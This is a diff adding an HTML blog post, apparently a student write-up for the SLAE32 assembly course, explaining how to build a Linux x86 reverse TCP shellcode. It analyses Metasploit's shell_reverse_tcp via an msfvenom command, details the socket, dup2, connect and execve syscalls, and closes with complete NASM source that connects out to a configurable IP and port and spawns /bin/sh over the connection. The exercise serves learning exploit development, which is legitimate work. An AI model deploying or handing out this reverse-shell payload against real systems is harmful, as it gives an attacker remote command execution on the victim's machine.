@@ -1,0 +1,427 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>SLAE32 | Jeremy Catelain</title>
+<meta name="generator" content="Jekyll v3.9.2" />
+<meta property="og:title" content="SLAE32" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Description of the assignment Create a Shell_Reverse_TCP Shellcode: Reverse connects to configured IP and Port; Execs Shell on sucessfull connection; IP and Port should be easily configurable." />
+<meta property="og:description" content="Description of the assignment Create a Shell_Reverse_TCP Shellcode: Reverse connects to configured IP and Port; Execs Shell on sucessfull connection; IP and Port should be easily configurable." />
+<link rel="canonical" href="http://localhost:4000/slae32/2022/09/25/Assign2-Rev.html" />
+<meta property="og:url" content="http://localhost:4000/slae32/2022/09/25/Assign2-Rev.html" />
+<meta property="og:site_name" content="Jeremy Catelain" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2022-09-25T08:45:58+02:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="SLAE32" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-09-25T08:45:58+02:00","datePublished":"2022-09-25T08:45:58+02:00","description":"Description of the assignment Create a Shell_Reverse_TCP Shellcode: Reverse connects to configured IP and Port; Execs Shell on sucessfull connection; IP and Port should be easily configurable.","headline":"SLAE32","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/slae32/2022/09/25/Assign2-Rev.html"},"url":"http://localhost:4000/slae32/2022/09/25/Assign2-Rev.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/main.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="Jeremy Catelain" /></head>
+<body><header class="site-header" role="banner">
+
+    <div class="wrapper"><div class="align-left">
+            <div class="image-cropper"><img src="/images/photo-profil-2.jpg" alt="photo de profil" class="rounded" /></div>
+            <div class="align-left2">
+                <a class="site-title" rel="author" href="/">Jeremy Catelain </a><div class="site-job">Cybersecurity Consultant</div></div>
+        </div><nav class="site-nav">
+            <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+            <label for="nav-trigger">
+                <span class="menu-icon">
+                    <svg viewBox="0 0 18 15" width="18px" height="15px">
+                        <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z" />
+                    </svg>
+                </span>
+            </label>
+
+            <div class="trigger"><a class="page-link" href="/categories/2022-09-14-categories.html">CATEGORIES</a><a class="page-link" href="/">Home</a><a class="page-link" href="/about/">ABOUT</a></div>
+        </nav></div>
+</header>
+<main class="page-content" aria-label="Content">
+
+        <div class="wrapper">
+                <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+        <header class="post-header">
+            <div class="post-header-about">
+                <h1 class="post-list-heading2 p-name" itemprop="name headline">SLAE32</h1>
+                <h1 class="post-list-heading3 p-name" itemprop="name headline">|  Assignment 2 - Reverse Shell</h1>
+            </div>
+            <p class="post-meta-title">
+                <time class="dt-published" datetime="2022-09-25T08:45:58+02:00" itemprop="datePublished">Sep 25, 2022
+                </time></p><a class="github-link-post" href="/TODO"> Github </a></header>
+
+        <div class="post-content e-content" itemprop="articleBody">
+            <h3 id="-description-of-the-assignment-"><span style="color:#2d8fb3;"> Description of the assignment </span></h3>
+
+<ul>
+  <li>Create a Shell_Reverse_TCP Shellcode:
+    <ul>
+      <li>Reverse connects to configured IP and Port;</li>
+      <li>Execs Shell on sucessfull connection;</li>
+    </ul>
+  </li>
+  <li>IP and Port should be easily configurable.</li>
+</ul>
+
+<!--more-->
+
+<h3 id="-msfvenom-example--socket_call-"><span style="color:#2d8fb3;"> MSFVenom example &amp; Socket_call </span></h3>
+
+<p>To perform this exercise, we started by analysing the reverse shell code of Metasploit to see how it works and what syscall are made. To do so, we followed the steps as follows to create an image of the different syscalls performed and to make it more visible.</p>
+
+<p>As follows the command line to generate the graphical schema of the metasploit reverse shell :</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom -p linux/x86/shell_reverse_tcp R | /opt/hackingtools/libemu/tools/sctest/sctest -vvv -Ss 100000 -G shell_reverse_tcp.dot
+
+Then convert into PNG file :
+
+dot shell_reverse_tcp.dot -Tpng -o shell_reverse_tcp.png 
+</code></pre></div></div>
+
+<p><strong>Result:</strong></p>
+
+<p><img src="/assets/slae32-img/assignment2/assignment2.1.png" alt="drawing" style="max-width:100%;" /></p>
+
+<p>As we can see, there are 4 syscalls :</p>
+<ul>
+  <li>socket</li>
+  <li>dup2</li>
+  <li>connect</li>
+  <li>execve</li>
+</ul>
+
+<p>Each of them will be detailled in the following parts.</p>
+
+<h2 id="socket-call">SOCKET CALL</h2>
+
+<p>The detail of the socket call can be displayed with the following command line :</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~# cat /usr/include/x86_64-linux-gnu/asm/unistd_32.h | grep socket
+    #define __NR_socketcall 102
+    #define __NR_socket 359
+    #define __NR_socketpair 360
+</code></pre></div></div>
+
+<p>Then, we looked into the details of the socketcall</p>
+
+<p><img src="assignment2-img/assignment2.2.png" alt="Picture" /></p>
+
+<p>As we can see, the socketcall is composed of first, the type of the syscall (socket, bind, …) and secondly its arguments.</p>
+
+<h2 id="socket">SOCKET</h2>
+
+<p>The socket syscall creates a socket which will listen for the incoming connections. It needs the following parameters as follows :</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>man 2 socket 
+</code></pre></div></div>
+
+<p><img src="assignment2-img/assignment2.4.png" alt="Picture" /></p>
+
+<p>Return value :
+<img src="assignment2-img/assignment2.5.png" alt="Picture" /></p>
+
+<p>with :</p>
+<ul>
+  <li>domain : The protocol family used (AF_INET, AF_LOCAL, …)</li>
+  <li>type : The type of the service (TCP, UDP, …)</li>
+  <li>protocol : Specify if a particular protocol will be used with the socket (0 most of the time)</li>
+</ul>
+
+<p>And the corresponding parameter values are listed in the files as follows :</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>DOMAIN AND PROTOCOLS parameters : 
+/usr/include/x86_64-linux-gnu/bits/socket.h
+
+TYPE parameter :
+/usr/include/bits/socket_type.h
+</code></pre></div></div>
+
+<p>The following parameters were use by the msfvenom bind shellcode shows :</p>
+<ul>
+  <li>ESP : 00000002 00000001 00000000</li>
+  <li>EAX : 0x66                                // in decimal 102 (syscall)</li>
+  <li>EBX : 1                                   // socket call</li>
+  <li>ECX : ESP :  00000002 00000001 00000000   // arg of the socket call</li>
+</ul>
+
+<p>The argument passed throught ECX are :</p>
+<ul>
+  <li>domain : 2      // PF_INET/AF_INET, IP protocol family</li>
+  <li>type : 1        // SOCK_STREAM, TCP connection based</li>
+  <li>protocol : 0    // Unspecified</li>
+</ul>
+
+<p><strong>Useful link :</strong> The details of the <em>socket</em> can be find in the following links :</p>
+<ul>
+  <li>http://shtroumbiniouf.free.fr/CoursInfo/Reseau2/Cours/SocketsBSD/SocketsBSD.html ()</li>
+  <li>http://sdz.tdct.org/sdz/les-sockets.html</li>
+</ul>
+
+<h2 id="dup2">DUP2</h2>
+
+<p>Now, we need to redirect all the file descriptors to the client scoketfd generated by the previous socket syscall.</p>
+
+<p><img src="assignment2-img/assignment2.6.png" alt="Picture" /></p>
+
+<p><img src="assignment2-img/assignment2.7.png" alt="Picture" /></p>
+
+<p>We will pass the following arguments :</p>
+<ul>
+  <li>EAX : 0x3f        // dup sys call</li>
+  <li>EBX : Previous EAX         // File descriptor returned by the accept call</li>
+  <li>ECX : 2 to 0 (loop)      // IN, OUT, ERR</li>
+</ul>
+
+<p>To perform the loop, we will use the intruction JNS as follows because it perform the jmp until the Sign Flag is set (SF=1), which mean that the zero is taken into account in the loop :</p>
+
+<p><img src="assignment2-img/assignment2.8.png" alt="Picture" /></p>
+
+<p>When we execute the code, we can see that the shellcode is listening.
+<img src="assignment2-img/assignment2.9.png" alt="Picture" /></p>
+
+<h2 id="connect">CONNECT</h2>
+
+<p>Then, we need to intiate a socket connection on a remote host by specifing the address and the port to connect to.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>man 2 connect
+</code></pre></div></div>
+
+<p><img src="assignment2-img/assignment2.10.png" alt="Picture" /></p>
+
+<p>With :</p>
+<ul>
+  <li>sockfd : file descriptor, return value of the socket sys call</li>
+  <li>
+    <p>sockaddr *addr // address argument which depends on the family</p>
+
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  struct sockaddr {
+      sa_family_t sa_family;
+      char        sa_data[14];
+  }
+</code></pre></div>    </div>
+
+    <p>In our case, with the Internet Family AF_INET, the address structure will be constructed as follows :</p>
+
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  struct sockaddr_in {
+      sa_family_t    sin_family; /* address family: AF_INET */
+      in_port_t      sin_port;   /* port in network byte order */
+      struct in_addr sin_addr;   /* internet address */
+  };
+
+  /* Internet address. */
+  struct in_addr {
+      uint32_t       s_addr;     /* address in network byte order */
+  };
+</code></pre></div>    </div>
+
+    <p>From :</p>
+
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  /usr/src/linux-headers-5.2.0-kali2-common/include/uapi/linux/in.h
+</code></pre></div>    </div>
+  </li>
+  <li>addrlen : The size, in bytes, of the address structure pointed to by addr which is 16</li>
+</ul>
+
+<p>Link:</p>
+<ul>
+  <li>IP manual : https://man7.org/linux/man-pages/man7/ip.7.html</li>
+  <li>Example : https://www.scip.ch/en/?labs.20200521</li>
+</ul>
+
+<p>Which mean that we need to pass the following registers :</p>
+<ul>
+  <li>EAX : 0x66    // SOCKET_CALL</li>
+  <li>EBX : 3       // SYS_CONNECT</li>
+  <li>ECX :
+    <ul>
+      <li>ESI         // file descriptor which is the return value of the socket syscall</li>
+      <li>Struct :
+        <ul>
+          <li>AF_INET : 2 // Family   (2 bytes)</li>
+          <li>The port : 4444 // 0x115c in hexa (6 bytes)</li>
+          <li>IP : 0.0.0.0 // push 00 on the stack (8 bytes)</li>
+        </ul>
+      </li>
+      <li>addrlen : 16 bytes</li>
+    </ul>
+  </li>
+</ul>
+
+<p>While i was checking that the return value is NULL (0x00) i set up a netcat to verify that the connection succeed.</p>
+
+<p><img src="assignment2-img/assignment2.11.png" alt="Picture" /></p>
+
+<h2 id="execve">EXECVE</h2>
+
+<p>Now that we created a socket which connect to a remote host, we finally have to launch a shell through that connection allowing the remote host to interact with the device.</p>
+
+<p><img src="assignment2-img/assignment2.12.png" alt="Picture" /></p>
+
+<p>We will pass the following arguments :</p>
+<ul>
+  <li>EAX : 0xb                             // execve syscall, 11 in decimal</li>
+  <li>EBX : Argument /bin//sh + 0X00000000</li>
+  <li>ECX : Address of the EBX string</li>
+  <li>EDX : NULL</li>
+</ul>
+
+<h2 id="code">CODE</h2>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>; Filename: ShellReverse.nasm
+; Author: Codor
+
+global _start
+
+section .text
+_start:
+    
+    ; SOCKET
+    
+    ; EBX
+    push ebx ; push the x00000000 on the stack
+    
+    inc ebx ; SYS_SOCKET = 1
+    push ebx ; push the 0x00000001 on the stack for the domain AF_INET of the SYS_SOCKET call 
+    
+    ; ECX
+    push byte 0x2 ; push the 0x00000002 on the stack for the type SOCK_STREAM
+    mov ecx, esp ; put the arguments of the socketcall into ECX
+
+    ; EDX is 0x00000000 by default
+
+    ; EAX
+    mov al, 0x66
+
+    ; socket call
+    int 0x80
+    
+    mov esi, eax
+    
+    ; DUP
+    ; EBX, File descriptor return by ACCEPT call
+    mov ebx, eax	; Retrieve the file descriptor
+    
+    ; EAX, dup2 sys call 0x3f
+    xor eax, eax
+    
+    ; initialize ECX 
+    xor ecx, ecx
+    mov cl, 0x2
+
+    ; LOOP
+DupLoop :
+    
+    mov al, 0x3f
+    int 0x80
+    dec ecx
+    jns DupLoop	
+
+
+    ; CONNECT
+    ; EBX ; SYS_CONNECT = 3
+    xor ebx, ebx
+    mov bl, 3
+
+    ; ECX, To modify
+    ; Creation of the struct sockaddr_in
+    
+    ; //////////////// Listening address ////////////
+    ; Description: Set up the address to listen to
+    ; Example : 
+    ; 	push edi ; Push on the stack the address 0.0.0.0
+    ; 	push 0x00000000 ; Same
+    push 0x0100007f ; 127.0.0.1
+
+    ; /////////////// Listening port ///////////////
+    ; Description : Set up the port to listen to
+    ; Example : push word 0x5c11 ; Push on the stack the port 4444
+    push word 0x5c11	
+    
+    push word 0x2 ; Push the Family AF_INET = 2
+    mov ecx, esp ; mov the structure into ecx
+    
+    ; put all parameters into ECX 
+        
+    push byte 0x16 ; Push on the stack the address length of 16
+    push ecx
+    push esi ; push the file descriptor
+    mov ecx, esp ; Move the stack into ECX
+    
+    ; EAX
+    xor eax, eax
+    mov al, 0x66
+    
+    ; connect call
+    int 0x80
+    
+
+
+    ; EXECVE /bin/sh	
+    ; Push the 0x00000000 on the stack
+    xor eax, eax
+    push eax
+    
+    ; put the string on the stack
+    push 0x68732f2f ; //sh : hs// : 68732f2f	
+    push 0x6e69622f ; /bin : nib/ : 6e69622f	
+    
+    ; setup EBX with the value of ESP
+    mov ebx, esp
+
+    ; set up EDX and push null bytes again
+    push eax
+    mov edx, esp
+
+    ; set up ECX argv address on the first dw and null in second dw
+    push ebx 
+    ; Then move the top of the stack into ECX
+    mov ecx, esp
+
+    ; EAX
+    mov al, 0xb
+    int 0x80
+</code></pre></div></div>
+
+
+        </div>
+
+
+        <!--<a class="u-url" href="/slae32/2022/09/25/Assign2-Rev.html" hidden></a>
+          -->
+    </article>
+
+        </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+      <!--<h2 class="footer-heading">Jeremy Catelain</h2> -->
+
+    <div class="Github-link"></div>
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col footer-col-1">
+        <!--<ul class="contact-list">
+          <li class="p-name">Jeremy Catelain</li>
+        </ul> -->
+      </div>
+
+
+      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a class="social-media-listed" href="https://github.com/jeremycatelain"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">jeremycatelain</span></a></li></ul>
+</div>
+
+      <div class="footer-col footer-col-3">
+          <p>COPYRIGHT 2022 JEREMY CATELAIN - ALL RIGHTS RESERVED.</p>
+      </div>
+  </div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
